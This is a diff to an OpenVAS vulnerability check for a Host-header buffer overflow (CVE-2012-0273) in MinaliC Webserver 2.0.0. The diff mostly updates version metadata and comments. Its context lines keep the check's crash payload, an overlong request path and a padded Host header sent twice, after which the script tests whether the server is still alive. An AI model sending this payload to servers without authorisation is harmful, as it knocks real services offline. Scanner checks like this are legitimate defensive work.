@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_minalic_web_server_bof_vuln.nasl 6698 2017-07-12 12:00:17Z cfischer $
+# $Id: gb_minalic_web_server_bof_vuln.nasl 11077 2018-08-22 09:40:33Z mmartin $
 #
 # MinaliC Host Header Handling Remote Buffer Overflow Vulnerability
 #
@@ -27,12 +27,12 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.803192");
-  script_version("$Revision: 6698 $");
+  script_version("$Revision: 11077 $");
   script_cve_id("CVE-2012-0273");
   script_bugtraq_id(52873);
   script_tag(name:"cvss_base", value:"7.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2017-07-12 14:00:17 +0200 (Wed, 12 Jul 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-08-22 11:40:33 +0200 (Wed, 22 Aug 2018) $");
   script_tag(name:"creation_date", value:"2013-04-16 13:14:39 +0530 (Tue, 16 Apr 2013)");
   script_name("MinaliC Host Header Handling Remote Buffer Overflow Vulnerability");
 
@@ -53,8 +53,8 @@ if(description)
   script_tag(name:"affected", value:"MinaliC Webserver version 2.0.0");
   script_tag(name:"insight", value:"The issue is due to user-supplied input is not properly
   validated when handling a specially crafted host header in the request.");
-  script_tag(name:"solution", value:"No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
+  script_tag(name:"solution", value:"No known solution was made available for at least one year
+  since the disclosure of this vulnerability. Likely none will be provided anymore.
   General solution options are to upgrade to a newer release, disable respective
   features, remove the product or replace the product by another one.");
   script_tag(name:"summary", value:"This host is running MinaliC Webserver and is prone to buffer
@@ -70,10 +70,8 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Get HTTP Port
 port = get_http_port(default:8080);
 
-## Confirm the application before trying exploit
 banner = get_http_banner(port: port);
 if("Server: MinaliC" >!< banner){
   exit(0);
@@ -85,7 +83,6 @@ if("Server: MinaliC" >!< res) {
   exit(0);
 }
 
-## build the exploit
 junk = crap(data:"0x41", length:245) + "[.|";
 host = crap(data:"0x90", length:61);
 
@@ -96,7 +93,6 @@ req = string("GET ", junk , " HTTP/1.1\r\n",
 res = http_send_recv(port:port, data:req);
 res = http_send_recv(port:port, data:req);
 
-## Check still server is alive or not, If not then
 ## server is died and it's vulnerable
 req = http_get(item:"/", port:port);
 res = http_keepalive_send_recv(port:port, data:req);
